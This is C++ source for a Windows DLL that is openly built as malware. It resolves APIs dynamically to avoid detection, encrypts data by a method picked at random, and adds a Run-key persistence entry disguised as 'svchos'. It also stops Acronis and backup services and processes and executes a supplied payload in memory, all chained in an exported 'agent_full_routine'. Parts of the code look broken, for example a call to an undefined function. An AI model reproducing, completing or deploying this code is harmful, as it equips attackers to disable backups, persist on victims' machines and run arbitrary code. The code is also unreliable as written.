#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <random>
#include <cstring>
#include <functional>

// ==================== HELPERS ====================
typedef void(*VoidFunc)();
typedef HMODULE(WINAPI* LoadLibA_t)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddr_t)(HMODULE, LPCSTR);

// Dynamic API resolver
FARPROC resolve_api(const char* dll, const char* func) {
    HMODULE hMod = LoadLibraryA(dll);
    if (!hMod) return nullptr;
    return GetProcAddress(hMod, func);
}

// ==================== DYNAMIC WINAPI ====================
#define DYN_FUNC(dll, name, ret, ...) \
    static ret(WINAPI* name)(__VA_ARGS__) = (ret(WINAPI*)(__VA_ARGS__))resolve_api(dll, #name);

// Kernel32
DYN_FUNC("kernel32.dll", VirtualAlloc, LPVOID, LPVOID, SIZE_T, DWORD, DWORD)
DYN_FUNC("kernel32.dll", VirtualProtect, BOOL, LPVOID, SIZE_T, DWORD, PDWORD)
DYN_FUNC("kernel32.dll", GetModuleFileNameW, DWORD, HMODULE, LPWSTR, DWORD)
DYN_FUNC("kernel32.dll", CreateToolhelp32Snapshot, HANDLE, DWORD, DWORD)
DYN_FUNC("kernel32.dll", Process32FirstW, BOOL, HANDLE, LPPROCESSENTRY32W)
DYN_FUNC("kernel32.dll", Process32NextW, BOOL, HANDLE, LPPROCESSENTRY32W)
DYN_FUNC("kernel32.dll", OpenProcess, HANDLE, DWORD, BOOL, DWORD)
DYN_FUNC("kernel32.dll", TerminateProcess, BOOL, HANDLE, UINT)
DYN_FUNC("kernel32.dll", CloseHandle, BOOL, HANDLE)
DYN_FUNC("kernel32.dll", GetTickCount, DWORD, void)

// Advapi32
DYN_FUNC("advapi32.dll", OpenSCManagerW, SC_HANDLE, LPCWSTR, LPCWSTR, DWORD)
DYN_FUNC("advapi32.dll", OpenServiceW, SC_HANDLE, SC_HANDLE, LPCWSTR, DWORD)
DYN_FUNC("advapi32.dll", ControlService, BOOL, SC_HANDLE, DWORD, LPSERVICE_STATUS)
DYN_FUNC("advapi32.dll", CloseServiceHandle, BOOL, SC_HANDLE)
DYN_FUNC("advapi32.dll", RegOpenKeyExW, LONG, HKEY, LPCWSTR, DWORD, REGSAM, PHKEY)
DYN_FUNC("advapi32.dll", RegSetValueExW, LONG, HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD)
DYN_FUNC("advapi32.dll", CryptAcquireContextW, BOOL, HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD)
DYN_FUNC("advapi32.dll", CryptCreateHash, BOOL, HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*)
DYN_FUNC("advapi32.dll", CryptHashData, BOOL, HCRYPTHASH, const BYTE*, DWORD, DWORD)
DYN_FUNC("advapi32.dll", CryptDeriveKey, BOOL, HCRYPTPROV, ALG_ID, HCRYPTHASH, DWORD, HCRYPTKEY*)
DYN_FUNC("advapi32.dll", CryptEncrypt, BOOL, HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD)
DYN_FUNC("advapi32.dll", CryptDestroyKey, BOOL, HCRYPTKEY)
DYN_FUNC("advapi32.dll", CryptDestroyHash, BOOL, HCRYPTHASH)
DYN_FUNC("advapi32.dll", CryptReleaseContext, BOOL, HCRYPTPROV, DWORD)

// ==================== RANDOM NAME ====================
std::string random_name(size_t len) {
    static const char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    static std::mt19937 rng((unsigned int)GetTickCount());
    std::string s;
    for (size_t i = 0; i < len; ++i) s += alphanum[rng() % (sizeof(alphanum) - 1)];
    return s;
}

// ==================== POLYMORPHIC ENCRYPTION ====================
void xor_encrypt(char* data, size_t length, const char* key, size_t key_len) {
    for (size_t i = 0; i < length; ++i) data[i] ^= key[i % key_len];
}

bool aes_encrypt(BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen, BYTE* out, DWORD* outLen) {
    HCRYPTPROV hProv = 0; HCRYPTKEY hKey = 0; HCRYPTHASH hHash = 0; bool success = false;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    CryptHashData(hHash, key, keyLen, 0);
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;
    DWORD len = *outLen; memcpy(out, data, dataLen);
    if (CryptEncrypt(hKey, 0, TRUE, 0, out, &len, *outLen)) { *outLen = len; success = true; }
cleanup:
    if (hHash) CryptDestroyHash(hHash);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return success;
}

void rc4_encrypt(BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen) {
    BYTE S[256], K[256]; int i, j = 0, t; BYTE temp;
    for (i = 0; i < 256; i++) { S[i] = i; K[i] = key[i % keyLen]; }
    for (i = 0; i < 256; i++) { j = (j + S[i] + K[i]) % 256; temp = S[i]; S[i] = S[j]; S[j] = temp; }
    i = j = 0;
    for (DWORD x = 0; x < dataLen; x++) {
        i = (i + 1) % 256; j = (j + S[i]) % 256;
        temp = S[i]; S[i] = S[j]; S[j] = temp;
        t = (S[i] + S[j]) % 256; data[x] ^= S[t];
    }
}

void polymorphic_encrypt(char* data, size_t length, const char* key, size_t key_len) {
    static std::mt19937 rng((unsigned int)GetTickCount());
    int choice = rng() % 3;
    if (choice == 0) xor_encrypt(data, length, key, key_len);
    else if (choice == 1) { DWORD outLen = (DWORD)length; aes_encrypt((BYTE*)data, (DWORD)length, (BYTE*)key, (DWORD)key_len, (BYTE*)data, &outLen); }
    else rc4_encrypt((BYTE*)data, (DWORD)length, (BYTE*)key, (DWORD)key_len);
}

// ==================== REGISTRY PERSISTENCE ====================
bool add_persistence(const std::wstring& exePath) {
    HKEY hKey;
    LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"svchos";
    if (!RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey)) {
        LONG lResult = RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath.c_str(), (exePath.size() + 1) * sizeof(wchar_t));
        return lResult == ERROR_SUCCESS;
    }
    return false;
}

// ==================== KILL SERVICES / PROCESSES ====================
std::vector<std::wstring> serviceNames = { L"Acronis VSS Provider", L"Enterprise Client Service" };
std::vector<std::wstring> processNames = { L"AcronisAgent.exe", L"bedbg.exe" };

void kill_services_and_processes() {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        for (auto& svc : serviceNames) {
            SC_HANDLE schService = OpenServiceW(scm, svc.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (schService) { SERVICE_STATUS_PROCESS ssp; ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp); CloseServiceHandle(schService); }
        }
        CloseServiceHandle(scm);
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            do { for (auto& proc : processNames) { if (_wcsicmp(pe.szExeFile, proc.c_str()) == 0) { HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (hProc) { TerminateProcess(hProc, 1); CloseHandle(hProc); } } } } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

// ==================== FILELESS IN-MEMORY EXECUTION ====================
bool execute_in_memory(BYTE* payload, SIZE_T size) {
    void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;
    memcpy(mem, payload, size);
    DWORD old;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
    auto func = (VoidFunc)mem;
    func();
    return true;
}


// ==================== DLL EXPORT ====================
extern "C" __declspec(dllexport) void agent_full_routine(
    const char* input, char* output, size_t output_len, BYTE* payload = nullptr, SIZE_T payload_size = 0
) {
    std::string keyStr = random_name(8);
    const char* key = keyStr.c_str();

    std::string result = agent_process_input(input);
    strncpy(output, result.c_str(), output_len - 1);
    output[output_len - 1] = '\0';

    polymorphic_encrypt(output, strlen(output), key, strlen(key));

    if (payload && payload_size > 0)
        execute_in_memory(payload, payload_size);

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    add_persistence(exePath);

    kill_services_and_processes();
}

// ==================== DLL ENTRY POINT ====================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
